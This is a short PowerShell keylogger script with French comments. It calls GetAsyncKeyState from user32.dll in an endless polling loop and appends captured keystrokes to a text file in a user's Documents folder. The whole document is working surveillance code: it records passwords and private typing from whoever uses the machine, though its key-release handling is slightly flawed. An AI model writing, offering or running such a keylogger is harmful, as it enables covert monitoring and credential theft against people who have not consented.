# Définir le fichier de sortie où les frappes seront enregistrées
$outputFile = "C:\Users\Aurel\Documents\keylog.txt"

# Fonction pour capturer les frappes
function Capture-KeyStroke {
    Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;

        public class Keyboard {
            [DllImport("user32.dll")]
            public static extern short GetAsyncKeyState(int vKey);
        }
"@

    # Créer un tableau pour garder la trace des touches déjà pressées
    $pressedKeys = @{}

    while ($true) {
        # Boucle infinie pour vérifier les frappes de clavier
        for ($i = 0; $i -lt 256; $i++) {
            $keyState = [Keyboard]::GetAsyncKeyState($i)

            # Si la touche est pressée (bit 0 est 1) et n'a pas été encore enregistrée
            if ($keyState -lt 0) {
                $key = [char]$i
                if (-not $pressedKeys[$key] -and $key -match '[a-zA-Z0-9!@#$%^&*(),.?":{}|<>]') {
                    # Enregistrer la touche dans le fichier (uniquement les caractères valides)
                    $key | Out-File -Append -FilePath $outputFile
                    $pressedKeys[$key] = $true  # Marquer la touche comme pressée
                }
            } else {
                # Réinitialiser l'état de la touche une fois relâchée
                $pressedKeys[$key] = $false
            }
        }
        Start-Sleep -Milliseconds 10
    }
}

# Appeler la fonction pour démarrer la capture
Capture-KeyStroke
